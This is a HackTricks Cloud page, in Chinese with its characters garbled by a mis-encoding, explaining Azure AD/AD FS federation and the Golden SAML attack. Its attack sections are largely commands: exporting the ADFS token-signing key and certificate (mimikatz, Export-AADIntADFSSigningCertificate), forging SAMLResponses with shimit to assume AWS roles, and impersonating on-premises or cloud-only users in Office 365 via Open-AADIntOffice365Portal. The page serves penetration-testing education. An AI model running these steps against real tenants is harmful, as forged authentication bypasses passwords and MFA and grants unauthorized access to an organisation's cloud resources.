# Az - Federation

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**è”é‚¦**æ˜¯ä¸€ç»„å»ºç«‹äº†**ä¿¡ä»»**çš„**åŸŸ**ã€‚ä¿¡ä»»çš„çº§åˆ«å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†é€šå¸¸åŒ…æ‹¬**èº«ä»½éªŒè¯**ï¼Œå‡ ä¹æ€»æ˜¯åŒ…æ‹¬**æˆæƒ**ã€‚ä¸€ä¸ªå…¸å‹çš„è”é‚¦å¯èƒ½åŒ…æ‹¬ä¸€ç»„å·²å»ºç«‹**ä¿¡ä»»**çš„**ç»„ç»‡**ï¼Œä»¥ä¾¿å¯¹ä¸€ç»„èµ„æºè¿›è¡Œ**å…±äº«è®¿é—®**ã€‚

æ‚¨å¯ä»¥å°†**æœ¬åœ°**ç¯å¢ƒä¸**Azure AD**è¿›è¡Œ**è”é‚¦**ï¼Œå¹¶ä½¿ç”¨æ­¤è”é‚¦è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒã€‚æ­¤ç™»å½•æ–¹æ³•ç¡®ä¿æ‰€æœ‰ç”¨æˆ·**èº«ä»½éªŒè¯åœ¨æœ¬åœ°**è¿›è¡Œã€‚æ­¤æ–¹æ³•å…è®¸ç®¡ç†å‘˜å®æ–½æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶çº§åˆ«ã€‚ä¸**AD FS**å’Œ PingFederate çš„è”é‚¦æ˜¯å¯ç”¨çš„ã€‚

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼Œåœ¨è”é‚¦ä¸­ï¼Œæ‰€æœ‰**èº«ä»½éªŒè¯**éƒ½å‘ç”Ÿåœ¨**æœ¬åœ°**ç¯å¢ƒä¸­ï¼Œç”¨æˆ·åœ¨æ‰€æœ‰å—ä¿¡ä»»çš„ç¯å¢ƒä¸­ä½“éªŒå•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ã€‚å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å…¶**æœ¬åœ°å‡­æ®**è®¿é—®**äº‘**åº”ç”¨ç¨‹åºã€‚

**å®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ (SAML)** ç”¨äºåœ¨æä¾›è€…ä¹‹é—´**äº¤æ¢**æ‰€æœ‰èº«ä»½éªŒè¯å’Œæˆæƒ**ä¿¡æ¯**ã€‚

åœ¨ä»»ä½•è”é‚¦è®¾ç½®ä¸­ï¼Œæœ‰ä¸‰ä¸ªå‚ä¸æ–¹ï¼š

* ç”¨æˆ·æˆ–å®¢æˆ·ç«¯
* èº«ä»½æä¾›è€… (IdP)
* æœåŠ¡æä¾›è€… (SP)

(å›¾ç‰‡æ¥è‡ª https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. æœ€åˆï¼Œç”¨æˆ·è®¿é—®ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆæœåŠ¡æä¾›è€…æˆ– SPï¼Œä¾‹å¦‚ AWS æ§åˆ¶å°æˆ– vSphere Web å®¢æˆ·ç«¯ï¼‰ã€‚æ ¹æ®å…·ä½“å®ç°ï¼Œæ­¤æ­¥éª¤å¯èƒ½ä¼šè¢«ç»•è¿‡ï¼Œç›´æ¥å°†å®¢æˆ·ç«¯å¼•å¯¼åˆ° IdPï¼ˆèº«ä»½æä¾›è€…ï¼‰ã€‚
2. éšåï¼ŒSP ç¡®å®šé€‚å½“çš„ IdPï¼ˆä¾‹å¦‚ï¼ŒAD FSï¼ŒOktaï¼‰è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚ç„¶åï¼Œå®ƒæ„å»ºä¸€ä¸ª SAMLï¼ˆå®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼‰AuthnRequestï¼Œå¹¶å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°æ‰€é€‰çš„ IdPã€‚
3. IdP æ¥ç®¡ï¼Œè¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚èº«ä»½éªŒè¯åï¼ŒIdP åˆ¶å®šä¸€ä¸ª SAMLResponseï¼Œå¹¶é€šè¿‡ç”¨æˆ·è½¬å‘ç»™ SPã€‚
4. æœ€åï¼ŒSP è¯„ä¼° SAMLResponseã€‚å¦‚æœæˆåŠŸéªŒè¯ï¼Œè¡¨æ˜ä¸ IdP ä¹‹é—´å­˜åœ¨ä¿¡ä»»å…³ç³»ï¼Œåˆ™ç”¨æˆ·è¢«æˆäºˆè®¿é—®æƒé™ã€‚è¿™æ ‡å¿—ç€ç™»å½•è¿‡ç¨‹çš„å®Œæˆï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨è¯¥æœåŠ¡ã€‚

**å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äº SAML èº«ä»½éªŒè¯å’Œå¸¸è§æ”»å‡»çš„ä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## ä¾§å‘ç§»åŠ¨

* AD FS æ˜¯åŸºäºå£°æ˜çš„èº«ä»½æ¨¡å‹ã€‚
* â€œ..å£°æ˜åªæ˜¯å…³äºç”¨æˆ·çš„è¯­å¥ï¼ˆä¾‹å¦‚ï¼Œå§“åã€èº«ä»½ã€ç»„ï¼‰ï¼Œä¸»è¦ç”¨äºæˆæƒè®¿é—®ä½äºäº’è”ç½‘ä¸Šä»»ä½•åœ°æ–¹çš„åŸºäºå£°æ˜çš„åº”ç”¨ç¨‹åºã€‚â€
* ç”¨æˆ·çš„å£°æ˜å†™å…¥ SAML ä»¤ç‰Œä¸­ï¼Œç„¶åç”± IdP ç­¾åä»¥æä¾›æœºå¯†æ€§ã€‚
* ç”¨æˆ·é€šè¿‡ ImmutableID è¿›è¡Œè¯†åˆ«ã€‚å®ƒæ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå¹¶å­˜å‚¨åœ¨ Azure AD ä¸­ã€‚
* ImmutableID å­˜å‚¨åœ¨æœ¬åœ°ä½œä¸º ms-DS-ConsistencyGuidï¼Œä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œå’Œ/æˆ–å¯ä»¥ä»ç”¨æˆ·çš„ GUID æ´¾ç”Ÿã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚è§ [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**é»„é‡‘ SAML æ”»å‡»ï¼š**

* åœ¨ ADFS ä¸­ï¼ŒSAML å“åº”ç”±ä»¤ç‰Œç­¾åè¯ä¹¦ç­¾åã€‚
* å¦‚æœè¯ä¹¦è¢«æ³„éœ²ï¼Œåˆ™å¯ä»¥ä½œä¸ºä»»ä½•åŒæ­¥åˆ° Azure AD çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼
* å°±åƒæˆ‘ä»¬çš„ PTA æ»¥ç”¨ä¸€æ ·ï¼Œç”¨æˆ·çš„å¯†ç æ›´æ”¹æˆ– MFA ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ªé€ äº†èº«ä»½éªŒè¯å“åº”ã€‚
* å¯ä»¥ä» AD FS æœåŠ¡å™¨æå–è¯ä¹¦ï¼Œå…·æœ‰ DA æƒé™ï¼Œç„¶åå¯ä»¥ä»ä»»ä½•è¿æ¥åˆ°äº’è”ç½‘çš„æœºå™¨ä¸Šä½¿ç”¨ã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚è§ [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### é»„é‡‘ SAML

**èº«ä»½æä¾›è€… (IdP)** ç”Ÿæˆ **SAMLResponse** ä»¥æˆæƒç”¨æˆ·ç™»å½•çš„è¿‡ç¨‹è‡³å…³é‡è¦ã€‚æ ¹æ® IdP çš„å…·ä½“å®ç°ï¼Œ**å“åº”**å¯èƒ½ä¼šä½¿ç”¨ **IdP çš„ç§é’¥**è¿›è¡Œ**ç­¾å**æˆ–**åŠ å¯†**ã€‚æ­¤è¿‡ç¨‹ä½¿ **æœåŠ¡æä¾›è€… (SP)** èƒ½å¤Ÿç¡®è®¤ SAMLResponse çš„çœŸå®æ€§ï¼Œç¡®ä¿å®ƒç¡®å®æ˜¯ç”±å—ä¿¡ä»»çš„ IdP å‘å‡ºçš„ã€‚

å¯ä»¥ä¸ [é»„é‡‘ç¥¨è¯æ”»å‡»](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) ç›¸æå¹¶è®ºï¼Œå…¶ä¸­ç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½å’Œæƒé™çš„å¯†é’¥ï¼ˆé»„é‡‘ç¥¨è¯çš„ KRBTGTï¼Œé»„é‡‘ SAML çš„ä»¤ç‰Œç­¾åç§é’¥ï¼‰å¯ä»¥è¢«æ“çºµä»¥**ä¼ªé€ èº«ä»½éªŒè¯å¯¹è±¡**ï¼ˆTGT æˆ– SAMLResponseï¼‰ã€‚è¿™å…è®¸å†’å……ä»»ä½•ç”¨æˆ·ï¼Œæˆäºˆå¯¹ SP çš„æœªæˆæƒè®¿é—®ã€‚

é»„é‡‘ SAML æä¾›æŸäº›ä¼˜åŠ¿ï¼š

* å®ƒä»¬å¯ä»¥**è¿œç¨‹åˆ›å»º**ï¼Œæ— éœ€æˆä¸ºç›¸å…³åŸŸæˆ–è”é‚¦çš„ä¸€éƒ¨åˆ†ã€‚
* å³ä½¿å¯ç”¨**åŒå› ç´ èº«ä»½éªŒè¯ (2FA)**ï¼Œå®ƒä»¬ä»ç„¶æœ‰æ•ˆã€‚
* ä»¤ç‰Œç­¾åçš„**ç§é’¥ä¸ä¼šè‡ªåŠ¨ç»­è®¢**ã€‚
* **æ›´æ”¹ç”¨æˆ·çš„å¯†ç ä¸ä¼šä½¿**å·²ç”Ÿæˆçš„ SAML æ— æ•ˆã€‚

#### AWS + AD FS + é»„é‡‘ SAML

[æ´»åŠ¨ç›®å½•è”é‚¦æœåŠ¡ (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) æ˜¯ä¸€é¡¹ Microsoft æœåŠ¡ï¼Œä¿ƒè¿›å—ä¿¡ä»»å•†ä¸šä¼™ä¼´ä¹‹é—´çš„**èº«ä»½ä¿¡æ¯å®‰å…¨äº¤æ¢**ï¼ˆè”é‚¦ï¼‰ã€‚å®ƒæœ¬è´¨ä¸Šå…è®¸åŸŸæœåŠ¡ä¸è”é‚¦å†…çš„å…¶ä»–æœåŠ¡æä¾›è€…å…±äº«ç”¨æˆ·èº«ä»½ã€‚

ç”±äº AWS ä¿¡ä»»è¢«æ³„éœ²çš„åŸŸï¼ˆåœ¨è”é‚¦ä¸­ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ¥æ½œåœ¨åœ°**è·å– AWS ç¯å¢ƒä¸­çš„ä»»ä½•æƒé™**ã€‚è¯¥æ”»å‡»éœ€è¦**ç”¨äºç­¾å SAML å¯¹è±¡çš„ç§é’¥**ï¼Œç±»ä¼¼äºåœ¨é»„é‡‘ç¥¨è¯æ”»å‡»ä¸­éœ€è¦ KRBTGTã€‚è®¿é—® AD FS ç”¨æˆ·å¸æˆ·è¶³ä»¥è·å–æ­¤ç§é’¥ã€‚

æ‰§è¡Œé»„é‡‘ SAML æ”»å‡»çš„è¦æ±‚åŒ…æ‹¬ï¼š

* **ä»¤ç‰Œç­¾åç§é’¥**
* **IdP å…¬å…±è¯ä¹¦**
* **IdP åç§°**
* **è§’è‰²åç§°ï¼ˆè¦æ‰¿æ‹…çš„è§’è‰²ï¼‰**
* åŸŸ\ç”¨æˆ·å
* AWS ä¸­çš„è§’è‰²ä¼šè¯åç§°
* äºšé©¬é€Šè´¦æˆ· ID

_åªæœ‰åŠ ç²—çš„é¡¹ç›®æ˜¯å¼ºåˆ¶æ€§çš„ã€‚å…¶ä»–é¡¹ç›®å¯ä»¥æ ¹æ®éœ€è¦å¡«å†™ã€‚_

è¦è·å–**ç§é’¥**ï¼Œéœ€è¦è®¿é—®**AD FS ç”¨æˆ·å¸æˆ·**ã€‚ä»é‚£é‡Œï¼Œå¯ä»¥ä½¿ç”¨ [mimikatz](https://github.com/gentilkiwi/mimikatz) ç­‰å·¥å…·ä»ä¸ªäººå­˜å‚¨ä¸­**å¯¼å‡ºç§é’¥**ã€‚è¦æ”¶é›†å…¶ä»–æ‰€éœ€ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ Microsoft.Adfs.Powershell snapinï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç¡®ä¿æ‚¨ä»¥ ADFS ç”¨æˆ·èº«ä»½ç™»å½•ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ä½¿ç”¨æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥å¿˜è®°ä¸€ä¸ªæœ‰æ•ˆçš„ SAMLResponseï¼Œä½œä¸ºæ‚¨æƒ³è¦å†’å……çš„ç”¨æˆ·ï¼Œä½¿ç”¨ [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### æœ¬åœ° -> äº‘
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ä¹Ÿå¯ä»¥ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º ImmutableID å¹¶å†’å……ä»–ä»¬ã€‚
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
